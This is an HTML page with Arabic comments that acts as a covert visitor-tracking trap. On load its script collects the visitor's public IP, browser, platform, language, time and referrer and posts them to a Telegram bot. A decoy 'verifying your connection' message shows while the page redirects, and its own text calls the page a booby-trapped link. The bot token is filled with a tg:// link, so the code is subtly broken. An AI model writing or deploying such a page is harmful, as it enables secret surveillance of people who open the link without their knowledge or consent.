<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="2;url=https://الموقع-الذي-تريد-توجيههم-إليه.com/">
  <script>
    // إرسال بيانات الزائر إلى بوت تيليجرام فور فتح الصفحة
    const BOT_TOKEN = "tg://openmessage?user_id=8717959254";
    const CHAT_ID = "8717959254";

    const data = {
      ip: "جاري الحصول على الـ IP عبر خدمة خارجية",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      time: new Date().toLocaleString(),
      referrer: document.referrer || "مباشر",
      url: window.location.href
    };

    // استخدام خدمة مجانية لجلب الـ IP العام
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(ipData => {
        data.ip = ipData.ip;
        // إرسال البيانات إلى البوت
        const msg = `🔴 *زائر جديد عبر الرابط الملغوم* 🔴\n` +
                    `🌐 IP: ${data.ip}\n` +
                    `💻 المتصفح: ${data.userAgent}\n` +
                    `🖥 المنصة: ${data.platform}\n` +
                    `🌍 اللغة: ${data.language}\n` +
                    `🕒 الوقت: ${data.time}\n` +
                    `🔗 الرابط السابق: ${data.referrer}\n` +
                    `📌 الرابط الحالي: ${data.url}`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
          })
        });
      })
      .catch(() => {
        // حتى لو فشل جلب IP، نرسل باقي البيانات
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `⚠️ زائر جديد (بدون IP): ${data.userAgent}`,
            parse_mode: 'Markdown'
          })
        });
      });
  </script>
</head>
<body>
  <p>جاري التحقق من اتصالك... سيتم تحويلك فوراً.</p>
</body>
</html>
